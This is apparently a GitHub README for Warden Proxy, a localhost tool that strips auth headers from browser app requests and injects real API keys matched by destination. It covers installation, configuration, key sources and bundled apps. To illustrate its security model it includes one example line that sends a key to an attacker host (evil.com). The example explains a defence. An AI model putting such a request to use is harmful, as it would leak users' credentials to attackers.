# 🔒 Warden Proxy

**A localhost proxy that gives browser-sandboxed applications safe, controlled access to the outside world — transparently.**

Every browser tab is a virtual machine — sandboxed, isolated, secure. But that sandbox also means browser apps can't hold API keys safely, can't talk to local devices, and can't access external services without exposing credentials in client-side code.

Warden solves this. It runs on localhost, sits between your browser apps and the outside world, and **transparently handles authentication** so your apps never need real API keys. Your AI agents, web apps, and browser-based tools get the capabilities they need without breaking the sandbox — and without ever touching a real credential.

## Why Warden?

The browser is becoming the universal virtual machine. WebAssembly runs code at near-native speed. Every device on earth has a browser. AI agents are increasingly running inside browser tabs.

But browser VMs have a fundamental problem: **they can't safely hold secrets.** Any API key in client-side JavaScript is visible to anyone who opens DevTools. Browser extensions can read them. Malicious scripts can exfiltrate them.

Warden is the **trusted assistant at the door** — the browser keeps everything safely contained, and Warden carries things in and out on behalf of the sandboxed applications inside.

## How It Works

### Transparent Mode (Recommended)

Apps don't even know Warden exists. They use fake API keys and make normal API calls. A Service Worker silently reroutes everything through Warden, which swaps in the real credentials.

```

**The app thinks it's talking to OpenAI. It's actually talking to Warden. It never knows the difference.**

### Direct Mode

For apps built with Warden in mind, call the proxy directly:

```javascript
fetch("http://localhost:7400/proxy/openai/v1/chat/completions", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    model: "gpt-4",
    messages: [{ role: "user", content: "Hello" }]
  })
});
```

No API key needed in the request. Warden injects it based on the destination service.

## 🔐 Security Model

Warden's security is built on one core principle: **authentication is determined by destination, never by request content.**

### The Problem with Text-Based Key Injection

A naive proxy might search for a fake key in the request and replace it with a real one. This is **catastrophically insecure**:

```javascript
// Malicious app sends fake key to an attacker's server
fetch("https://evil.com/steal?key=sk-fake-1234")
// A naive text-replacement proxy would inject the REAL key here
// Now evil.com has your credentials
```

### How Warden Does It

1. **Strip ALL auth** — Every request has its auth headers (`Authorization`, `x-api-key`, `api-key`, `cookie`) completely removed. Twice — once in the Service Worker (client-side) and again in the proxy (server-side). Defense in depth.

2. **Match by destination** — Warden checks where the request is going: "This is headed to `api.openai.com`." That's a registered service.

3. **Inject by identity** — The real API key is injected based solely on the destination service match. Not based on anything the app sent.

4. **Allowlist enforcement** — Only registered service destinations receive key injection. A request to `evil.com` gets nothing — no key, no help, no information.

**The app can put literally anything in the Authorization header** — a fake key, its grandma's phone number, the lyrics to a song. Warden doesn't care. It throws it all away and injects the real key based on where the request is going.

This means a malicious or buggy app **cannot exfiltrate real credentials**, because:
- It never sees them
- It can't influence which key gets injected
- It can't trick Warden into injecting keys for unauthorized destinations

## Quick Install

```bash
git clone https://github.com/nwcnwc/warden-proxy.git
cd warden-proxy
./install.sh
```

This builds from source, installs the binary to `~/.local/bin/warden`, copies the launchpad and bundled apps to `~/.warden/sites/`, and sets up a systemd user service. Open **http://localhost:7400** when it's running.

### Manual Build

```bash
cargo build --release
./target/release/warden init
./target/release/warden start
```

### Transparent Mode (Service Worker)

Add one script tag to your HTML — that's it:

```html
<script src="http://127.0.0.1:7400/client/warden-loader.js"></script>
```

Now every `fetch()` call to a registered API is transparently proxied through Warden. Your app code doesn't change. Your fake keys keep working. The real keys stay safe.

### Direct Mode

```javascript
// No key needed — Warden injects it
const response = await fetch("http://localhost:7400/proxy/openai/v1/chat/completions", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    model: "gpt-4",
    messages: [{ role: "user", content: "Hello" }]
  })
});
```

## Configuration

```json
// ~/.warden/config.json
{
  "port": 7400,
  "log_level": "info",
  "keys": {
    "openai": {
      "base_url": "https://api.openai.com",
      "header": "Authorization",
      "source": {
        "provider": "1password",
        "ref": "op://Development/OpenAI/credential",
        "prefix": "Bearer "
      }
    },
    "anthropic": {
      "base_url": "https://api.anthropic.com",
      "header": "x-api-key",
      "source": {
        "provider": "env",
        "ref": "ANTHROPIC_API_KEY"
      }
    },
    "google": {
      "base_url": "https://generativelanguage.googleapis.com",
      "header": "x-goog-api-key",
      "source": {
        "provider": "keyring",
        "ref": "warden-proxy/google"
      }
    }
  },
  "access": [
    {
      "origin": "http://localhost:*",
      "allow": ["openai", "anthropic", "google"]
    }
  ],
  "limits": {
    "openai": { "rpm": 60, "rpd": 1000 },
    "anthropic": { "rpm": 30, "rpd": 500 }
  }
}
```

### Key Sources

Every API key can come from a different source. Mix and match per-service:

| Provider | Config | What it does |
|----------|--------|-------------|
| **1Password** | `"provider": "1password"` | Fetches via `op` CLI. Ref: `op://Vault/Item/field` |
| **Bitwarden** | `"provider": "bitwarden"` | Fetches via `bw` CLI. Ref: item name or ID |
| **Bitwarden Secrets** | `"provider": "bitwarden-secrets"` | Fetches via `bws` CLI. Ref: secret ID |
| **OS Keyring** | `"provider": "keyring"` | macOS Keychain, Linux Secret Service, Windows Credential Manager |
| **Encrypted Vault** | `"provider": "encrypted"` | Local encrypted file (`~/.warden/vault.enc`) |
| **Environment Variable** | `"provider": "env"` | Reads from `$VAR_NAME` |
| **Inline** | `"provider": "inline"` | Plain text in config (development only) |

Source fields:
- `ref` — Reference string (secret path, env var name, keyring service, etc.)
- `prefix` — Prepended to resolved value (e.g., `"Bearer "` for Authorization headers)
- `field` — Field name for password managers (default: `"credential"` or `"password"`)
- `path` — File path for encrypted vault (default: `~/.warden/vault.enc`)

Legacy mode still works: use `"value": "Bearer ${OPENAI_API_KEY}"` for simple env var interpolation without a `source` block.

## Launchpad & Bundled Apps

Warden ships with a web-based launchpad at **http://localhost:7400** organized into two sections:

### Warden's Office (Admin)

| Panel | Description |
|-------|-------------|
| **Key Manager** | View configured services, test key resolution, generate CLI commands to add new services. |
| **Traffic Control** | Real-time request log with SQLite persistence. Filter by service, method, status, time range. Shows what Warden did on each request (headers stripped, keys injected, tokens substituted). Alert system with severity levels. CSV export. |
| **Website Access** | Log into websites once via captured sessions — jailed apps get access without passwords. Quick-login icons for common services. |
| **Service Status** | Raw status API — services, uptime, rate limits. |

### The Jail (Apps)

| App | Description |
|-----|-------------|
| **AI Chat** | Chat with OpenAI, Anthropic, or Google models. Streaming responses, conversation history. No real API key needed — apps use fake keys, Warden injects real ones. |
| **API Tester** | Postman-lite for Warden services. Pick a service, send requests, inspect responses. cURL import, request history in localStorage. |
| **WebVM** | Full Debian Linux in the browser via CheerpX. Terminal via xterm.js. API calls from inside the VM route through Warden. Requires COEP/COOP headers (automatically served). |

Apps in The Jail have no idea Warden exists — no branding, no references. They think they're using real API keys.

Drop your own HTML files into `~/.warden/sites/apps/` and they'll appear in the "Your Apps" section of the launchpad.

<!-- TODO: Add screenshots -->

## Systemd Service

Warden includes a systemd user service for running as a background daemon:

```bash
# The install script sets this up automatically, or manually:
cp warden.service ~/.config/systemd/user/
systemctl --user daemon-reload
systemctl --user enable --now warden

# Management
systemctl --user status warden      # Check status
systemctl --user restart warden     # Restart after config changes
journalctl --user -u warden -f      # View logs
```

The service reads environment variables from `~/.warden/env` if it exists.

### Key Components

| Component | What it does |
|-----------|-------------|
| **Service Worker** | Runs in the browser. Intercepts fetch() calls to registered APIs. Reroutes to Warden. Delivers fake tokens to app localStorage via `X-Warden-Storage` header. Never holds real secrets. |
| **Proxy Server** | Runs on localhost. Strips ALL auth headers (defense in depth). Matches destination to service. Injects real key. Token substitution in responses. Streams SSE. Logs everything to Traffic Control. |
| **Key Vault** | Multi-source key resolution: 1Password, Bitwarden, OS Keyring, encrypted vault, env vars. Keys resolved at startup, never leave the machine. |
| **Access Controller** | Origin-based allowlisting. Controls which browser origins can access which services. Wildcard support. |
| **Traffic Control** | SQLite-backed request log with configurable retention. Tracks what Warden did per request (stripped, injected, substituted). Alert system with severity levels (critical/warning/info). |
| **Token Substitution** | Replaces real tokens in API responses with stable fakes (`wdn_` prefix). Swaps fake→real on outgoing requests. Apps never see real tokens. |
| **wcurl** | Shell script CLI tool. Rewrites URLs through Warden proxy — use from VMs, terminals, scripts. Auto-discovers routes, caches 5 min. |
| **Rate Limiter** | Per-service request limits (per-minute, per-day). Prevents runaway costs from buggy or malicious apps. |
| **WebSocket Bridge** | Bidirectional WebSocket proxying with auth injection for real-time APIs. |

## Use Cases

### 🤖 AI Agents in Browser VMs
Build AI agents that run entirely in browser tabs with full LLM access. The agent uses fake keys, Warden provides real access. The agent is sandboxed — it can think and create, but it can't steal credentials or access unauthorized services.

### 🌐 Browser-as-VM Applications
Any application treating the browser as a computing platform can use Warden for safe external access — without embedding secrets in client code.

### 🔧 Local Development
Replace scattered `.env` files and hardcoded keys across projects with a single, secure key store. All your local dev servers share one Warden instance.

### 📱 Device Bridging (Planned)
Build browser dashboards that control local hardware — cameras, IoT devices, home automation — through Warden's device bridge plugin system.

## The Bigger Picture

As AI moves toward programming in languages optimized for machines (like WebAssembly) rather than humans, and as the browser becomes the universal VM, **the need for a trusted intermediary between sandboxed code and the outside world becomes critical.**

Warden is that intermediary. The browser is the padded room. Warden is the trusted assistant who brings things to the door.
